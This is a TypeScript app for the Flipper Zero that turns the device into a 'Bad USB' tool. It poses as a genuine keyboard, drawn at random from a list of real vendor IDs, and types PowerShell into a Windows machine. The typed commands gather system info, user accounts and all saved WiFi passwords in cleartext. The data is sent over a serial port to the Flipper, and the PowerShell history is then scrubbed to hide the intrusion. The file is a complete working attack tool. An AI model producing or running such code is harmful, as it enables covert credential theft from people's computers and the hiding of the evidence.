// import modules
// caution: `eventLoop` HAS to be imported before `gui`, and `gui` HAS to be
// imported before any `gui` submodules.
import * as eventLoop from "@flipperdevices/fz-sdk/event_loop";
import * as gui from "@flipperdevices/fz-sdk/gui";
import * as dialog from "@flipperdevices/fz-sdk/gui/dialog";
import * as loading from "@flipperdevices/fz-sdk/gui/loading";
import * as submenu from "@flipperdevices/fz-sdk/gui/submenu";
import * as notify from "@flipperdevices/fz-sdk/notification";
import * as badusb from "@flipperdevices/fz-sdk/badusb";
import * as math from "@flipperdevices/fz-sdk/math";

// data:
interface BadUSBProfile {
   vid: number;
   pid: number;
   mfrName?: string;
   prodName?: string;
}
const usbProfiles: BadUSBProfile[] = [
   {
      vid: 0x045e,
      pid: 0xfff8,
      mfrName: "Microsoft Corp.",
      prodName: "Keyboard",
   },
   {
      vid: 0x045e,
      pid: 0x0800,
      mfrName: "Microsoft Corp.",
      prodName: "Wireless Keyboard",
   },
   {
      vid: 0x045e,
      pid: 0x07b9,
      mfrName: "Microsoft Corp.",
      prodName: "Wired Keyboard 200",
   },
   {
      vid: 0x045e,
      pid: 0x0752,
      mfrName: "Microsoft Corp.",
      prodName: "Wired Keyboard 400",
   },
   {
      vid: 0x045e,
      pid: 0x0750,
      mfrName: "Microsoft Corp.",
      prodName: "Wired Keyboard 600",
   },
   {
      vid: 0x046a,
      pid: 0x0001,
      mfrName: "CHERRY",
      prodName: "Keyboard",
   },
   {
      vid: 0x046a,
      pid: 0x0001,
      mfrName: "CHERRY",
      prodName: "Keyboard",
   },
   {
      vid: 0x046a,
      pid: 0xbe90,
      mfrName: "CHERRY",
      prodName: "Keyboard",
   },
   {
      vid: 0x046a,
      pid: 0x0008,
      mfrName: "CHERRY",
      prodName: "Wireless Keyboard and Mouse",
   },
   {
      vid: 0x046b,
      pid: 0x0001,
      mfrName: "American Megatrends, Inc.",
      prodName: "Keyboard",
   },
   {
      vid: 0x046d,
      pid: 0xc221,
      mfrName: "Logitech, Inc.",
      prodName: "G11/G15 Keyboard / Keyboard",
   },
   {
      vid: 0x046d,
      pid: 0xc529,
      mfrName: "Logitech, Inc.",
      prodName: "Logitech Keyboard + Mice",
   },
   {
      vid: 0x046d,
      pid: 0xc52b,
      mfrName: "Logitech, Inc.",
      prodName: "Unifying Receiver",
   },
   {
      vid: 0x055d,
      pid: 0xc001,
      mfrName: "Samsung Electro-Mechanics Co.",
      prodName: "Keyboard",
   },
   {
      vid: 0x05ac,
      pid: 0x0201,
      mfrName: "Apple, Inc.",
      prodName: "USB Keyboard [Alps or Logitech, M2452]",
   },
   {
      vid: 0x05ac,
      pid: 0x021a,
      mfrName: "Apple, Inc.",
      prodName: "Internal Keyboard/Trackpad (ANSI)",
   },
   {
      vid: 0x05ac,
      pid: 0x0259,
      mfrName: "Apple, Inc.",
      prodName: "Internal Keyboard/Trackpad",
   },
   {
      vid: 0x05ac,
      pid: 0x025a,
      mfrName: "Apple, Inc.",
      prodName: "Internal Keyboard/Trackpad",
   },
   {
      vid: 0x1241,
      pid: 0x1503,
      mfrName: "Belkin",
      prodName: "Keyboard",
   },
   {
      vid: 0x1241,
      pid: 0xf767,
      mfrName: "Belkin",
      prodName: "Keyboard",
   },
   {
      vid: 0x413c,
      pid: 0x2010,
      mfrName: "Dell Computer Corp.",
      prodName: "Keyboard Hub",
   },
];
type ScriptPlatform = "Windows" | "Mac" | "Linux";
const platforms: string[] = ["Windows", "Mac", "Linux"];
interface BadUSBCommand {
   id: string;
   name: string;
   platform: ScriptPlatform;
   cmd: string;
   delay?: number;
}
const availableCommands = [
   {
      id: "pc_info",
      name: "Get PC Info",
      platform: "Windows",
      cmd: "Get-ComputerInfo|Out-String",
   },
   {
      id: "user_info",
      name: "Get Users",
      platform: "Windows",
      cmd: "net user",
   },
   {
      id: "wifi",
      name: "WiFi Passwords",
      platform: "Windows",
      cmd: '(netsh wlan show profiles) | Select-String "\\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\\W+\\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String',
      delay: 10000,
   },
];
let windowsCmdNames = [];
let macCmdNames = [];
let linuxCmdNames = [];
for (let i = 0; i < availableCommands.length; i++) {
   if (availableCommands[i].platform === "Windows") {
      windowsCmdNames.push(availableCommands[i].name);
   } else if (availableCommands[i].platform === "Mac") {
      macCmdNames.push(availableCommands[i].name);
   } else if (availableCommands[i].platform === "Linux") {
      linuxCmdNames.push(availableCommands[i].name);
   }
}
// a common pattern is to declare all the views that your app uses on one object
const views = {
   loading: loading.make(),
   startBadUsb: dialog.makeWith({
      header: "Bad USB Exfiltrate",
      text: "Exfiltrate data to Flipper\nusing Bad USB! Ready?",
      center: "Start!",
   }),
   exfilNotif: dialog.makeWith({
      header: "Bad USB Exfiltrate",
      text: "Now exfiltrating to Flipper...",
   }),
   done: dialog.makeWith({
      header: "Bad USB Exfiltrate",
      text: "Success!",
      center: "Done",
   }),
   error: dialog.makeWith({
      header: "Bad USB Exfiltrate",
      text: "Unable to connect to victim\ndevice.",
      center: "Quit",
   }),
   nonBlockingLoading: dialog.makeWith({
      text: "Loading...",
   }),
   platformChooser: submenu.makeWith({
      header: "Select a platform",
      items: platforms,
   }),
   scriptChooserWin: submenu.makeWith({
      header: "Select a Windows Script",
      items: windowsCmdNames,
   }),
   scriptChooserMac: dialog.makeWith({
      header: "Select a Mac Script",
      text: "Coming Soon!",
   }),
   // scriptChooserMac: submenu.makeWith({
   //    header: "Select a Mac Script",
   //    items: macCmdNames,
   // }),
   scriptChooserLinux: dialog.makeWith({
      header: "Select a Linux Script",
      text: "Coming Soon!",
   }),
   // scriptChooserLinux: submenu.makeWith({
   //    header: "Select a Linux Script",
   //    items: linuxCmdNames,
   // }),
};

// functions:
function numToPaddedHex(num: number): string {
   let result: string = num.toString(16);
   while (result.length < 4) {
      result = "0" + result;
   }
   return result;
}
function runBadUsb(
   command: string,
   cmdDelay: number | undefined,
   outName: string | undefined
) {
   // Initialize some defaults (defaults in func signature not supported)
   if (!cmdDelay) cmdDelay = 300;
   if (!outName) outName = "info";

   // Set up Bad USB:
   let deviceProfile: BadUSBProfile =
      usbProfiles[math.floor(math.random() * usbProfiles.length)];
   badusb.setup(deviceProfile);

   // Wait for Bad USB connection:
   let ready: boolean = badusb.isConnected();
   let attempts: number = 5;
   while (!ready && attempts > 0) {
      delay(1000);
      notify.blink("yellow", "long");
      ready = badusb.isConnected();
      attempts--;
   }

   // Run script:
   if (ready) {
      notify.blink("blue", "long");

      delay(500);
      badusb.press("GUI", "r");
      delay(500);

      badusb.println("powershell");
      delay(3000);
      badusb.println("$d=(" + command + ");"); // The actual command to be executed
      delay(cmdDelay);
      badusb.println('$SUSB="USB\\\\VID_0483&PID_5740";'); // the device ID of the Flipper.
      badusb.println(
         '$SPATH="/ext/apps_data/exfil_' +
            "${env:computername}_" +
            outName +
            '.txt";'
      );
      // Write data to Flipper:
      badusb.println(
         '1..600|%{Try{$p=New-Object System.IO.Ports.SerialPort("$(Get-PNPDevice -PresentOnly | Where{$_.InstanceID -match $SUSB -and $_.Class -eq "Ports"} | % name | select-string -Pattern \'COM[0-9]\' | % { $_.matches.value })",230400,"None",8,"one");$p.open();$p.Write("storage write $SPATH `r`n");$p.Write($d);$p.Write("$([char] 3)");$p.Close();break}Catch{Sleep 1}}'
      );
      // One more command to get rid of any evidence we were here:
      badusb.println(
         'Clear-History;(Get-Content -Path "$((Get-PSReadlineOption).HistorySavePath)" | Select-Object -SkipLast 5) | Set-Content -Path "$((Get-PSReadlineOption).HistorySavePath)";exit'
      );
      delay(300);

      badusb.quit();
      print("Done");
      return 0;
   }
   badusb.quit();
   print("USB not connected");
   return 1;
}

// stop app on center button press
eventLoop.subscribe(
   views.startBadUsb.input,
   (_sub, button, gui, views) => {
      if (button === "center") {
         gui.viewDispatcher.switchTo(views.platformChooser);
      }
   },
   gui,
   views
);

eventLoop.subscribe(
   views.platformChooser.chosen,
   (_sub, _item, gui, views) => {
      if (_item === 0) {
         gui.viewDispatcher.switchTo(views.scriptChooserWin);
      } else if (_item === 1) {
         gui.viewDispatcher.switchTo(views.scriptChooserMac);
      } else if (_item === 2) {
         gui.viewDispatcher.switchTo(views.scriptChooserLinux);
      }
   },
   gui,
   views
);

eventLoop.subscribe(
   views.scriptChooserWin.chosen,
   (_sub, index, gui, views) => {
      // Simulate running badusb
      print("Running " + availableCommands[index as number].name);
      gui.viewDispatcher.switchTo(views.loading);
      const exitCode: number = runBadUsb(
         availableCommands[index as number].cmd,
         availableCommands[index as number].delay,
         availableCommands[index as number].id
      );
      if (exitCode) {
         print("Error during Bad USB execution.");
         gui.viewDispatcher.switchTo(views.error);
         notify.error();
      } else {
         // Provide time for exfiltration
         print("Exfiltrating..");
         gui.viewDispatcher.switchTo(views.exfilNotif);
         delay(3000);
         gui.viewDispatcher.switchTo(views.loading);
         delay(5000);
         print("Data exfiltrated!");
         gui.viewDispatcher.switchTo(views.done);
         notify.success();
      }
   },
   gui,
   views
);

eventLoop.subscribe(
   views.done.input,
   (_sub, button, eventLoop) => {
      if (button === "center") eventLoop.stop();
   },
   eventLoop
);

eventLoop.subscribe(
   views.error.input,
   (_sub, button, eventLoop) => {
      if (button === "center") eventLoop.stop();
   },
   eventLoop
);

// stop app on back button press
eventLoop.subscribe(
   gui.viewDispatcher.navigation,
   (_sub, _item, eventLoop) => {
      eventLoop.stop();
   },
   eventLoop
);

// run app
gui.viewDispatcher.switchTo(views.startBadUsb);
eventLoop.run();
